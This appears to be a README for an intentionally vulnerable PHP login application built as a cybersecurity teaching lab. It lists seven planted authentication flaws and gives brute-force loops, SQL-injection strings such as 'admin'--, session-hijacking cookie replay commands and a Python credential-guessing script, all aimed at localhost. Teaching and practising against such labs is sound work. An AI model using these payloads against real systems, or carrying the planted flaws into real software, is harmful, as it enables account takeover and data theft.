# 🔓 Broken Authentication Testing & Learning Suite

> **📚 Educational Resource**: Comprehensive toolkit untuk pembelajaran cybersecurity dengan fokus pada authentication vulnerabilities  
> **⚠️ Disclaimer**: Hanya untuk tujuan educational dan authorized penetration testing  
> **🎯 Target**: Aplikasi web yang sengaja dibuat vulnerable untuk pembelajaran  

---

## 📋 Overview

Repository ini berisi aplikasi web yang sengaja dibuat vulnerable beserta toolkit lengkap untuk menguji dan memahami berbagai jenis serangan pada sistem authentication. Toolkit ini dirancang untuk:

- **Cybersecurity Students**: Memahami vulnerability authentication secara praktis
- **Developers**: Belajar secure coding practices
- **Security Professionals**: Practice penetration testing techniques
- **Educators**: Teaching material untuk cybersecurity courses

---

## 🏗️ Arsitektur Aplikasi

```
┌─────────────────────────────────────────┐
│             Docker Environment           │
├─────────────────────────────────────────┤
│  ┌─────────────┐ ┌────────────┐ ┌─────┐ │
│  │   Web App   │ │  MySQL DB  │ │Redis│ │
│  │ PHP 8.1 +   │ │            │ │     │ │
│  │  Apache     │ │  Port 3308 │ │6379 │ │
│  │  Port 8081  │ │            │ │     │ │
│  └─────────────┘ └────────────┘ └─────┘ │
└─────────────────────────────────────────┘
```

**Services:**
- **Web Application**: PHP 8.1 + Apache (Port 8081)
- **Database**: MySQL 8.0 (Port 3308)  
- **Cache**: Redis 7 (Port 6379)
- **Access URL**: http://localhost:8081

---

## 🚨 Vulnerabilities Implemented

| ID | Vulnerability | Severity | OWASP Category | Status |
|----|---------------|----------|----------------|--------|
| **V1** | No Rate Limiting | 🔴 High | A07:2021 | ✅ Active |
| **V2** | Plain Text Passwords | 🔴 High | A02:2021 | ✅ Active |
| **V3** | SQL Error Disclosure | 🔴 High | A03:2021 | ✅ Active |
| **V4** | Insecure Session Management | 🔴 High | A07:2021 | ✅ Active |
| **V5** | Session Fixation (Broken) | 🟡 Medium | A07:2021 | ⚠️ Faulty |
| **V6** | Missing Security Headers | 🟡 Medium | A05:2021 | ✅ Active |
| **V7** | JavaScript Session Exposure | 🟡 Medium | A07:2021 | ✅ Active |

---

## 🛠️ Testing Toolkit

### 📁 **Files Structure**

```
broken-auth/
├── 📄 README.md                    # This file
├── 📄 ATTACK_SCENARIOS.md          # Comprehensive attack guide
├── 📄 Discussion.md                # Session & cookies discussion
├── 📄 RANGKUMAN_PERCAKAPAN.md      # Conversation summary
├── 🐍 attack_testing_suite.py      # Main testing framework
├── 🐍 session_hijacking_demo.py    # Session security demos
├── 🐍 sql_injection_tester.py      # SQL injection testing
├── 🚀 run_tests.sh                 # Interactive test runner
├── 🐳 docker-compose.yml           # Container orchestration
├── 🐳 Dockerfile                   # Web app container
├── 🗄️ init.sql                     # Database initialization
└── 📁 src/                         # Application source code
    ├── index.php                   # Main login page
    ├── config.php                  # Database & session config
    ├── admin.php                   # Admin panel
    ├── profile.php                 # User profile
    ├── register.php                # User registration
    ├── forgot-password.php         # Password reset
    └── logout.php                  # Logout functionality
```

### 🐍 **Python Testing Scripts**

#### **1. Comprehensive Attack Suite** (`attack_testing_suite.py`)
```bash
python3 attack_testing_suite.py
```
**Features:**
- 🔓 Brute force attack simulation
- 🍪 Session security analysis
- 💉 SQL injection testing  
- 🔄 Password reset vulnerability testing
- 📊 Comprehensive vulnerability reporting

#### **2. Session Security Demo** (`session_hijacking_demo.py`)
```bash
python3 session_hijacking_demo.py
```
**Features:**
- 🍪 Cookie security flag analysis
- 🔓 Session hijacking demonstration
- 🔗 Session fixation testing
- 📋 Detailed security recommendations

#### **3. SQL Injection Tester** (`sql_injection_tester.py`)
```bash
python3 sql_injection_tester.py
```
**Features:**
- 💉 Multiple injection techniques (Error, Boolean, Union, Time-based)
- 🔍 Blind SQL injection testing
- 📊 Vulnerability impact assessment
- 🛡️ Mitigation recommendations

### 🚀 **Interactive Test Runner** (`run_tests.sh`)
```bash
# Interactive mode
./run_tests.sh

# Automated mode
./run_tests.sh --auto
```

**Testing Options:**
1. **Quick Vulnerability Scan** - Fast overview of main vulnerabilities
2. **Brute Force Attack Demo** - Live demonstration of credential attacks
3. **Session Security Demo** - Cookie and session analysis
4. **SQL Injection Demo** - Database attack simulation
5. **Comprehensive Python Suite** - Full automated testing
6. **Run All Tests** - Complete automated scan

---

## 🚀 Quick Start Guide

### **Step 1: Setup Environment**
```bash
# Clone repository
git clone <repository-url>
cd broken-auth

# Start application
docker-compose up -d

# Verify application is running
curl http://localhost:8081
```

### **Step 2: Run Quick Tests**
```bash
# Make script executable
chmod +x run_tests.sh

# Run automated test suite
./run_tests.sh --auto
```

### **Step 3: Explore Vulnerabilities**
```bash
# Interactive testing
./run_tests.sh

# Manual testing examples
curl -X POST http://localhost:8081/index.php -d "username=admin&password=admin"
curl -X POST http://localhost:8081/index.php -d "username=admin'--&password=anything"
```

---

## 📚 Learning Resources

### 📖 **Documentation Files**

#### **1. ATTACK_SCENARIOS.md**
- Complete step-by-step attack methodologies
- Vulnerability analysis dengan code examples
- Mitigation strategies dan security best practices
- Tools dan commands untuk manual testing

#### **2. Discussion.md**
- Deep dive into session management
- Cookie security analysis
- Session ID vs Cookies explanation
- Practical demonstrations

#### **3. RANGKUMAN_PERCAKAPAN.md**
- Conversation summary dari pembelajaran process
- Troubleshooting guide untuk common issues
- Setup instructions dan configuration details

### 🎯 **Test Credentials**

| Username | Password | Role | Status |
|----------|----------|------|--------|
| `admin` | `admin` | Admin | ✅ Works |
| `john` | `password` | User | ✅ Works |
| `jane` | `123456` | User | ✅ Works |
| `bob` | `qwerty` | User | ✅ Works |
| `charlie` | `password123` | Moderator | ✅ Works |

---

## 🔍 Demonstration Results

### ✅ **Successful Attack Examples**

#### **Brute Force Attack**
```
🎯 Testing 5 common credential combinations...
✅ SUCCESS! admin:admin works
✅ SUCCESS! john:password works  
✅ SUCCESS! jane:123456 works
✅ SUCCESS! bob:qwerty works
Success Rate: 4/5 (80%)
```

#### **Cookie Security Analysis**
```
🍪 Cookie Security Analysis:
❌ HttpOnly flag missing - vulnerable to XSS
❌ Secure flag missing - works over HTTP  
❌ SameSite flag missing - vulnerable to CSRF
```

#### **SQL Injection Testing**
```
💉 SQL Injection Results:
🚨 SQL ERROR DETECTED! admin'--
🚨 SQL ERROR DETECTED! ' OR '1'='1'--
🚨 PDOException exposed database structure
```

---

## 🛡️ Security Learning Objectives

### 🎓 **After completing this lab, you should understand:**

1. **Authentication Vulnerabilities:**
   - How brute force attacks work and why rate limiting is crucial
   - The dangers of plain text password storage
   - Session management security requirements

2. **Session Security:**
   - Difference between Session ID and Cookies
   - Importance of cookie security flags (HttpOnly, Secure, SameSite)
   - Session hijacking and fixation attack techniques

3. **Input Validation:**
   - SQL injection attack vectors and prevention
   - Importance of parameterized queries
   - Error handling best practices

4. **Secure Development:**
   - Security by design principles
   - OWASP Top 10 vulnerabilities in practice
   - Defensive programming techniques

---

## 🔧 Advanced Testing

### 🌐 **Manual Testing Commands**

#### **Brute Force Testing**
```bash
# Single credential test
curl -X POST http://localhost:8081/index.php \
  -d "username=admin&password=admin" \
  -c cookies.txt

# Rate limiting test
for i in {1..10}; do
  curl -X POST http://localhost:8081/index.php \
    -d "username=admin&password=wrong$i"
  echo "Attempt $i completed"
done
```

#### **Session Hijacking**
```bash
# Get victim's session
curl -c victim_cookies.txt http://localhost:8081

# Extract session ID
session_id=$(grep PHPSESSID victim_cookies.txt | cut -f7)

# Use session as attacker
curl -b "PHPSESSID=$session_id" http://localhost:8081/profile.php
```

#### **SQL Injection**
```bash
# Error-based injection
curl -X POST http://localhost:8081/index.php \
  -d "username=admin'&password=test"

# Authentication bypass attempt
curl -X POST http://localhost:8081/index.php \
  -d "username=admin'--&password=anything"
```

### 🐍 **Python Automation**

```python
import requests

# Automated brute force
session = requests.Session()
for username in ['admin', 'john', 'jane']:
    for password in ['admin', 'password', '123456']:
        response = session.post(
            'http://localhost:8081/index.php',
            data={'username': username, 'password': password}
        )
        if 'Login successful' in response.text:
            print(f"SUCCESS: {username}:{password}")
```

---

## 🚨 Security Warnings

### ⚠️ **Important Disclaimers**

1. **Educational Purpose Only**: Semua tools dan techniques dalam repository ini hanya untuk tujuan pembelajaran cybersecurity

2. **Authorized Testing Only**: Jangan gunakan tools ini untuk testing sistem tanpa otorisasi yang jelas

3. **Responsible Disclosure**: Jika menemukan vulnerability di sistem real, ikuti responsible disclosure practices

4. **Legal Compliance**: Pastikan semua aktivitas testing comply dengan local laws dan regulations

### 🛡️ **Ethical Guidelines**

- ✅ Test only on systems you own or have explicit permission
- ✅ Document findings professionally
- ✅ Share knowledge for educational purposes
- ❌ Never use for malicious purposes
- ❌ Never test production systems without authorization
- ❌ Never cause damage or data loss

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. **Educational Focus**: Ensure contributions have clear educational value
2. **Documentation**: Include comprehensive documentation for new features
3. **Safety**: Maintain the educational-only nature of the project
4. **Code Quality**: Follow security best practices even in vulnerable code examples

---

## 📞 Support & Contact

- **Issues**: Open GitHub issues for bugs or questions
- **Discussions**: Use GitHub Discussions for learning questions
- **Security**: For security-related questions, follow responsible disclosure

---

## 📜 License

This project is licensed under MIT License - see LICENSE file for details.

**Educational Use Disclaimer**: This software is provided for educational purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.

---

## 🔗 References

- **OWASP Top 10 2021**: https://owasp.org/www-project-top-ten/
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **OWASP Session Management Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework

---

> **🎓 Happy Learning!** Remember: The goal is to understand vulnerabilities so you can build more secure applications. Use this knowledge responsibly to make the digital world safer for everyone.

---

<div align="center">

**🔒 Security Through Education 🔒**

*"The more you know about attacks, the better you can defend against them"*

</div>